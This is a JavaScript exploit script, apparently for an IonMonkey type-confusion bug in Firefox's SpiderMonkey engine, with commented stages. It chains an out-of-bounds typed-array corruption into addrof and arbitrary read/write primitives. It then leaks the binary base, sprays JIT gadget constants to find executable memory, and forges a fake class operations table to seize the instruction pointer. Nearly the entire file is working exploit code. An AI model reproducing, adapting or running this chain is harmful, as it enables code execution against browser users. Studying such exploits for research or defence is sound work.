var fakeObj = new Uint32Array(0x30);
JSCopyBuffer = new Uint8Array(0x8);
JSCopyBuffer2 = new Uint8Array(0x8);

function toHexString(byteArray) {
  var s = '0x';
  byteArray.forEach(function(byte) {
    s += ('0' + (byte & 0xFF).toString(16)).slice(-2);
  });
  return s;
}

function copy(src)  {
    var dst = new ArrayBuffer(src.byteLength);
    new Uint8Array(dst).set(new Uint8Array(src));
    return dst;
}

function bytesFromHex(str,pad){
  if (str.length%2) str="0"+str;
  var bytes = str.match(/../g).map(function(s){
    return parseInt(s,16);
  });
  if (pad) for (var i=bytes.length;i<pad;++i) bytes.unshift(0);
  return bytes;
}

String.prototype.rjust = function rjust(n,chr){
  chr = chr || '0'
  if(this.length>n)
    return this.toString();
  return (chr.repeat(n)+this.toString()).slice(-1*n);
}

String.prototype.ljust = function ljust(n,chr){
  chr = chr || '0'
  if(this.length>n)
    return this.toString();
  return (this.toString()+chr.repeat(n)).slice(0,n);
}

function dtoint(num){
  int=new Uint32Array(new Float64Array([num]).buffer)
  //console.log(int[1].toString(16)+int[0].toString(16));
  return (int[1].toString(16)+int[0].toString(16));
}

//All helper functions above

console.log("Start of script");

var u8junk = new Uint8Array (0x20);
u8junk[0] = 1
u8junk[1] = 1;
u8junk[2] = 3;
u8junk[3] = 3;

// By shrinking the side of u32junk to 0x20/4, we can place the buffer pointer directly below the object!!
// This way, we can leak useful addressses
var u32junk = new Uint32Array(0x20 / 4);

const v4 = [u32junk, u32junk, u32junk, u32junk, u32junk];

function v7(index) {
	
	//this if branch is hit after a few calls of v4.pop
    if (v4.length == 0) {
		//v4 is now a sparse array, so it scans up the prototype chain
        v4[3] = u32junk;
    }

    // pop the last value. IonMonkey will, based on inferred types, conclude that the result
    // will always be an object, which is untrue when  p[0] is fetched here.
    v11 = v4.pop();
    
	// Then it will crash here when dereferencing a controlled double value as pointer.
    console.log(v11[0]);
	v11[index] = 0x700;	
	if(v11[0] == 50528513){
		console.log("Type confusion!!!");
		return true;
	}
    // Force JIT compilation.
    for (let v15 = 0; v15 < 10000; v15++) {}
}

var p = {};
//p.__proto__ = [1.1, 1.2, 1.3];
p.__proto__ = [u32junk, u32junk, u32junk];


//BEBF414141414141
//this indexed property is not checked by IonMonkey
//intermediate prototype (p) between the array and the ArrayPrototype is not checked
p[0] = u8junk;

//p[0] = 2261634.5098039214;
v4.__proto__ = p;

for (let v31 = 0; v31 < 1000; v31++) {
    result = (v7(18));
	if (result == true){
		console.log("U32Junk length corrupted to 0xFF, OOB R/W achieved!!");
		break;
	}
}

var arbReadHelper = new Array(1.1, 1.2, 1.3, {});

//arbReadHelper starts at index 56
//we will be leaking an empty element
elementPointerAddr = u32junk[63].toString(16) + u32junk[62].toString(16);
console.log("ArbReadHelper Element pointer address = ", elementPointerAddr);

emptyElementLeak = u32junk[75].toString(16) + u32junk[74].toString(16);
console.log("Empty element pointer address = ", emptyElementLeak);

emptyElementLeak = emptyElementLeak.slice(4);
console.log("Empty element pointer address = ", emptyElementLeak);

console.log("Setting element pointer address to point to empty object array");
highVal = parseInt((emptyElementLeak.slice(0,emptyElementLeak.length - 8)),16);
lowVal = (parseInt(emptyElementLeak.slice(emptyElementLeak.length - 8),16) + 0x18);

u32junk[63] = (highVal);
u32junk[62] = (lowVal);

PIELeak = arbReadHelper[0];
PIELeak = parseInt(dtoint(PIELeak),16);
PIEBase = PIELeak - 0x009edac0;
console.log("PIE Leak = ", PIELeak.toString(16));
console.log("PIE Base = ", PIEBase.toString(16));

highVal = parseInt((elementPointerAddr.slice(0,elementPointerAddr.length - 8)),16);
lowVal = (parseInt(elementPointerAddr.slice(elementPointerAddr.length - 8),16));
u32junk[63] = (highVal);
u32junk[62] = (lowVal);

function addrof(obj){
	original = arbReadHelper[3];
	arbReadHelper[3] = obj;
	addr = u32junk[75].toString(16) + u32junk[74].toString(16);
	console.log("Address of obj = ", addr.slice(4));
	arbReadHelper[3] = original;
	return addr.slice(4);
}

function arbRead(addr){
	highVal = parseInt((addr.slice(0,addr.length-8)),16);
	lowVal = (parseInt(addr.slice(addr.length-8),16));
	
	u32junk[63] = (highVal);
	u32junk[62] = (lowVal);
	
	leakBytes = arbReadHelper[0];
	leakBytes = parseInt(dtoint(leakBytes),16);
	
	highVal = parseInt((elementPointerAddr.slice(0,elementPointerAddr.length - 8)),16);
	lowVal = (parseInt(elementPointerAddr.slice(elementPointerAddr.length - 8),16));
	u32junk[63] = (highVal);
	u32junk[62] = (lowVal);
	
	return leakBytes;
	//console.log(leakBytes.toString(16));
}

function arbRead2(addr){
	highVal = parseInt((addr.slice(0,addr.length-8)),16);
	lowVal = (parseInt(addr.slice(addr.length-8),16));
	
	u32junk[151] = (highVal);
	u32junk[150] = (lowVal);
	
	return e;
}

e = new Uint8Array(0x8);
arbWriteHelper = u32junk[151].toString(16) + u32junk[150].toString(16);
console.log("Address of ArbWriteHelper = ", addrof(e));
console.log("ArbWriteHelper Element Pointer Address = ", arbWriteHelper);

function arbWrite(addr, value){
	highVal = parseInt((addr.slice(0,addr.length-8)),16);
	lowVal = (parseInt(addr.slice(addr.length-8),16));
	
	u32junk[151] = (highVal);
	u32junk[150] = (lowVal);
	
	byteArray = bytesFromHex(value, 8);

	e[0] = byteArray[7];
	e[1] = byteArray[6];
	e[2] = byteArray[5];
	e[3] = byteArray[4];
	e[4] = byteArray[3];
	e[5] = byteArray[2];
	e[6] = byteArray[1];
	e[7] = byteArray[0];
	
	return;
}


const BringYourOwnGadgets = function () {
	const B = 2261634.5098039214;
	const C = 2261634.5098039214;
    const D = -9.255963134931783e+61;
    const O = -9.255963134931783e+61;
    const A = -9.255963134931783e+61;
    const R = -9.255963134931783e+61;
    const E = -9.255963134931783e+61;
};

for(let Idx = 0; Idx < 0x12; Idx++) {
    BringYourOwnGadgets();
}


BringYourOwnGadgetsAddr = addrof(BringYourOwnGadgets);
console.log("Jit address = ", BringYourOwnGadgetsAddr);

//dt -r2 JSFunction::U 01b82ffb0c00+28
JSFunction_U_Addr = ((parseInt(BringYourOwnGadgetsAddr, 16) + 0x28).toString(16));
JSJitInfo_Addr = ((parseInt(BringYourOwnGadgetsAddr, 16) + 0x28 + 0x8).toString(16));
JSJitInfo_Value = arbRead(JSJitInfo_Addr);
JSJitInfo_RWX = arbRead(JSJitInfo_Value.toString(16));

console.log("JSFunction_U_Addr = ", JSFunction_U_Addr.toString(16));
console.log("JSJitInfo_Addr = ", JSJitInfo_Addr.toString(16));
console.log("JSJitInfo_Value = ", JSJitInfo_Value.toString(16));
console.log("JSJitInfo_RWX = ", JSJitInfo_RWX.toString(16));

for (var i = 0; i < 0x100; i++){
	leak = arbRead(JSJitInfo_RWX.toString(16));
	JSJitInfo_RWX =  JSJitInfo_RWX + 0x8;
	leakStr = leak.toString(16);
	if (leakStr.includes("ccccccc")){
		shellcode_addr = JSJitInfo_RWX;
		console.log("FOUND SHELLCODE AT ", shellcode_addr.toString(16));
		break;
	}
	//console.log(leakStr);
}



var RIPControlObj = [1.1];
addr = addrof(RIPControlObj);
console.log("Address of RIPControlObject = ", addr.toString(16));


JSGroupValue = arbRead(addr);
console.log("JSGroupValue = ", JSGroupValue.toString(16));

addr = JSGroupValue.toString(16);
JSClassValue = arbRead2(addr);

//need to map to another place or else will end up corrupting the actual address pointers
for (var i = 0; i < 8; i++){
    JSCopyBuffer[i] = JSClassValue[i];
}

JSClassValue = toHexString(JSCopyBuffer.reverse());
console.log("JSClassValue = ", JSClassValue);

addr = parseInt(JSClassValue, 16) + 0x10;

JScOpsPointer = arbRead2(addr.toString(16));
for (var i = 0; i < 8; i++){
    JSCopyBuffer[i] = JScOpsPointer[i];
}
JScOpsPointer = toHexString(JSCopyBuffer.reverse());
console.log("JScOpsPointer = ", JScOpsPointer);

addr = parseInt(JScOpsPointer, 16);

JSAddPropertyMethodPointer = arbRead2(addr.toString(16));
for (var i = 0; i < 8; i++){
    JSCopyBuffer[i] = JSAddPropertyMethodPointer[i];
}
JSAddPropertyMethodPointer = toHexString(JSCopyBuffer.reverse());
console.log("JSAddPropertyMethodPointer = ", JSAddPropertyMethodPointer);

addr = addrof(fakeObj);
console.log("Fake object address = ", addr);
addr = parseInt(addr, 16) + 0x38;
fakeObjBufferPointer = arbRead(addr.toString(16));

console.log("Copying class structure...");

for (var z = 0; z < 7; z++){
	
	addr = parseInt(JSClassValue, 16) + (0x8 * z);
	console.log("Copying addr ", addr.toString(16));
	JSCopyBuffer2 = arbRead2(addr.toString(16));
	for (var i = 0; i < 8; i++){
		JSCopyBuffer[i] = JSCopyBuffer2[i];
	}
	JSCopyBuffer2 = toHexString(JSCopyBuffer.reverse());
	
	valueToWrite = JSCopyBuffer2.toString(16);
	valueToWrite = valueToWrite.slice(2);
	addrToWrite = fakeObjBufferPointer + (0x8 * z);
	arbWrite(addrToWrite.toString(16), valueToWrite);
	
	console.log("Copying next member...");
	
}

console.log("Now overwriting RIPControlObj class pointer");
addr = addrof(RIPControlObj);
JSCopyBuffer2 = arbRead2(addr.toString(16));
for (var i = 0; i < 8; i++){
	JSCopyBuffer[i] = JSCopyBuffer2[i];
}
JSCopyBuffer2 = toHexString(JSCopyBuffer.reverse());
addrToWrite = JSCopyBuffer2;
addrToWrite = addrToWrite.slice(2);
valueToWrite = fakeObjBufferPointer.toString(16);
arbWrite(addrToWrite.toString(16), valueToWrite);

console.log("Now overwriting cops to point to shellcode");
valueToWrite = fakeObjBufferPointer + (0x8 * 10);
valueToWrite = valueToWrite.toString(16);
addrToWrite = fakeObjBufferPointer + (0x8 * 2);
arbWrite(addrToWrite.toString(16), valueToWrite);

valueToWrite = shellcode_addr + 6;
valueToWrite = valueToWrite.toString(16);
addrToWrite = fakeObjBufferPointer + (0x8 * 10);
arbWrite(addrToWrite.toString(16), valueToWrite);

console.log("We are done...");
console.log("Sleeping a while just for all the console messages...");
console.log("RIP Control will trigger a break point in debugger");
function sleepFor( sleepDuration ){
    var now = new Date().getTime();
    while(new Date().getTime() < now + sleepDuration){ /* do nothing */ } 
}
sleepFor(50);
RIPControlObj.c = 1;

